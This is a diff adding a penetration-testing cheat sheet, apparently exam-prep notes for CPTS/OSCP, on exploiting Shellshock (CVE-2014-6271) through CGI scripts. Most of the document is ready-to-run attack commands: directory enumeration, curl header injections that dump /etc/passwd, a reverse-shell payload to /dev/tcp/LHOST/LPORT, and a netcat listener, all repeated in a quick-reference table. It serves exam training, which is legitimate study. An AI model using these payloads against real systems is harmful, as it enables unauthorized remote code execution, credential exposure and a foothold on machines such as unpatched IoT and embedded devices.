@@ -1,0 +1,67 @@
+🧠 "Got This, Do That" - Shellshock (CVE-2014-6271) via CGI
+Got This ➜ Do That
+Found a CGI endpoint (e.g., /cgi-bin/access.cgi)
+➡️ Use gobuster to enumerate:
+
+bash
+Copy
+Edit
+gobuster dir -u http://<IP>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+Curl returns 200 OK but no output
+➡️ It may be a vulnerable CGI script — test with User-Agent header injection:
+
+bash
+Copy
+Edit
+curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' http://<IP>/cgi-bin/access.cgi
+✅ If /etc/passwd is dumped → Vulnerable to Shellshock
+
+Confirmed vulnerable
+➡️ Send a reverse shell payload via header:
+
+bash
+Copy
+Edit
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<IP>/cgi-bin/access.cgi
+🔥 Start listener:
+
+bash
+Copy
+Edit
+nc -lvnp <LPORT>
+Got a shell
+➡️ You’re probably www-data
+→ Enumerate for local privesc, creds, pivot ops
+
+⚡ Fast Exploit Reference
+Step	Command
+Dir scan	gobuster dir -u http://<IP>/cgi-bin/ -w ... -x cgi
+Check vuln	curl -H 'User-Agent: () { :; }; echo vulnerable' http://<IP>/cgi-bin/foo.cgi
+Dump passwd	curl -H 'User-Agent: () { :; }; /bin/cat /etc/passwd' http://<IP>/cgi-bin/foo.cgi
+Reverse shell	curl -H 'User-Agent: () { :; }; bash -i >& /dev/tcp/LHOST/LPORT 0>&1' http://<IP>/cgi-bin/foo.cgi
+Listener	nc -lvnp <LPORT>
+
+🔍 Why Shellshock (2014) Is Still in CPTS
+Legacy Lives On
+Companies still have old-ass CGI scripts running in the wild, especially in:
+
+IoT devices
+
+Embedded systems
+
+Forgotten corners of DMZs
+
+Simple Foothold
+It's a one-liner RCE with almost no setup. If you find it, you're in within seconds. Great for exam speedruns.
+
+Foundational Learning
+Helps build instinct for:
+
+Header-based payloads
+
+Exploiting server-side scripts
+
+Environment variable manipulation (key in Linux privesc too)
+
+It’s a "Gimme" on Exams
+If you see /cgi-bin/ during CPTS or OSCP? Bet money it's Shellshock. They’re practically handing you root access with a bow.
